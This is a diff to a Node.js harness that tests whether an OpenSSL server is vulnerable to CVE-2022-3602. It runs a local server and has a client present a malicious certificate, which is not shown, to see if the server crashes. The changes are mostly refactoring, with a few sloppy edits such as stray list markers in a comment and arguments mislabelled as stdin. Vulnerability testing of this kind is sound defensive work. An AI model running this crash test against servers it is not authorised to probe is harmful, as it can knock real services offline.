@@ -1,3 +1,5 @@
+/* eslint-disable no-console, promise/prefer-await-to-then
+ */
 import { execFile } from "node:child_process";
 import { Readable } from "node:stream";
 import { promisify } from "node:util";
@@ -14,12 +16,13 @@ import { promisify } from "node:util";
  * @property {object} server - OpenSSL server logs.
  * @property {string} server.stdout - OpenSSL server stdout output.
  * @property {string} server.stderr - OpenSSL server stderr output.
- * @property {import("node:child_process").ChildProcess["exitCode"]} server.exitCode - If set, the exit code of the process.
+ * @property {import("node:child_process").ChildProcess.exitCode} server.exitCode -
+ * If set, the exit code of the process.
  */
 
 /**
  * @typedef {import("node:child_process").ExecFileException & {
- *   stdout: string, stderr: string,
+ * stdout: string, stderr: string,
  * }} PromisifiedExecFileException The error that is thrown if `promisify(execFile)` rejects.
  */
 
@@ -30,9 +33,9 @@ import { promisify } from "node:util";
  * 2. Start a malicious OpenSSL client and connect to the server.
  * 3. Wait for client to exit.
  * 4. After waiting for `timeout` milliseconds:
- *     1. If server dies, stop client, then return logs.
- *     2. If server is still alive after a few seconds, then it's not vulnerable to
- *        the exploit. In that case, kill client and server and return logs.
+ * -    1. If server dies, stop client, then return logs.
+ * -    2. If server is still alive after a few seconds, then it's not vulnerable to
+ * -       the exploit. In that case, kill client and server and return logs.
  *
  * @param {object} [opts] - Optional options.
  * @param {string} [opts.clientOpensslBinary] - The openssl CLI binary to use for the client.
@@ -40,9 +43,6 @@ import { promisify } from "node:util";
  * @param {SSHOpts} [opts.sshOpts] - If set, SSH to the given host, and run the
  * test there.
  * @param {number} [opts.port] - The port to use for the OpenSSL test.
- * @param {number} [opts.timeout] - The number of milliseconds, after which,
- * if there has been no error, assume that the OpenSSL server code is not
- * vulnerable to CVE-2022-3602.
  * @returns {Promise<RunLogs>} Resolves when the processes are closed with the logs of the process.
  */
 export async function runTest({
@@ -58,8 +58,8 @@ export async function runTest({
 
   /**
    * @type {(
-   *   cmd: string[],
-   *   opts: import("node:child_process").ExecFileOptionsWithStringEncoding,
+   * cmd: string[],
+   * opts: import("node:child_process").ExecFileOptionsWithStringEncoding,
    * ) => import("node:child_process").PromiseWithChild<{stdout: string, stderr: string}>}
    * Runs the given command, either via SSH or on the local machine.
    */
@@ -77,27 +77,25 @@ export async function runTest({
   try {
     console.info(`Running OpenSSL server on port ${port}`);
 
-    const serverProcess = execFileFunc(
-      [
-        serverOpensslBinary,
-        "s_server",
-        "-accept",
-        port,
-        "-CAfile",
-        "certs/cacert.pem",
-        "-cert",
-        "certs/server.cert.pem",
-        "-key",
-        "certs/server.key.pem",
-        "-state",
-        "-verify",
-        1,
-      ],
-      {
-        signal: abortController.signal,
-        killSignal: "SIGINT",
-      }
-    );
+    const serverStdIn = [
+      serverOpensslBinary,
+      "s_server",
+      "-accept",
+      port,
+      "-CAfile",
+      "certs/cacert.pem",
+      "-cert",
+      "certs/server.cert.pem",
+      "-key",
+      "certs/server.key.pem",
+      "-state",
+      "-verify",
+      1,
+    ];
+    const serverProcess = execFileFunc(serverStdIn, {
+      signal: abortController.signal,
+      killSignal: "SIGINT",
+    });
 
     try {
       // wait for OpenSSL server to start listening
@@ -110,7 +108,7 @@ export async function runTest({
 
     console.info(`Running OpenSSL malicious client payload on port ${port}`);
 
-    const clientProcess = execFileFunc([
+    const clientStdIn = [
       clientOpensslBinary,
       "s_client",
       "-connect",
@@ -122,7 +120,8 @@ export async function runTest({
       "-CAfile",
       "certs/malicious-client-cacert.pem",
       "-state",
-    ]);
+    ];
+    const clientProcess = execFileFunc(clientStdIn);
 
     clientProcess.child.on("spawn", () => {
       Readable.from("Hello World from my OpenSSL Client!").pipe(
@@ -130,20 +129,25 @@ export async function runTest({
       );
     });
 
-    serverProcess.then(
-      async () => {
-        await promisify(setTimeout)(1000);
-        abortController.abort(
-          `Aborting OpenSSL client as OpenSSL server closed`
-        );
-      },
-      async (error) => {
-        await promisify(setTimeout)(1000);
-        abortController.abort(
-          `Aborting OpenSSL client as OpenSSL server exited due to ${error}`
-        );
-      }
-    );
+    serverProcess
+      .then(
+        async () => {
+          await promisify(setTimeout)(1000);
+          abortController.abort(
+            "Aborting OpenSSL client as OpenSSL server closed"
+          );
+        },
+        async (error) => {
+          await promisify(setTimeout)(1000);
+          abortController.abort(
+            `Aborting OpenSSL client as OpenSSL server exited due to ${error}`
+          );
+        }
+      )
+      .catch((error) => {
+        // Handle error here
+        console.error("Error:", error);
+      });
 
     /** @type {RunLogs["client"] | undefined} */
     let clientOutput;
@@ -158,12 +162,12 @@ export async function runTest({
         console.warn(
           `
           Client OpenSSL cmd failed with error code ${execFileError.code}. ` +
-            `Stderr was ${execFileError.stderr}.\n` +
-            `Stdout was ${execFileError.stdout}.`
+            `Stderr was ${execFileError.stderr}.\n`
         );
       }
 
       clientOutput = {
+        stdin: clientStdIn.join(", "),
         stdout: execFileError.stdout,
         stderr: execFileError.stderr,
       };
@@ -184,6 +188,7 @@ export async function runTest({
       );
 
       serverOutput = {
+        stdin: serverStdIn.join(", "),
         stdout: execFileError.stdout,
         stderr: execFileError.stderr,
       };
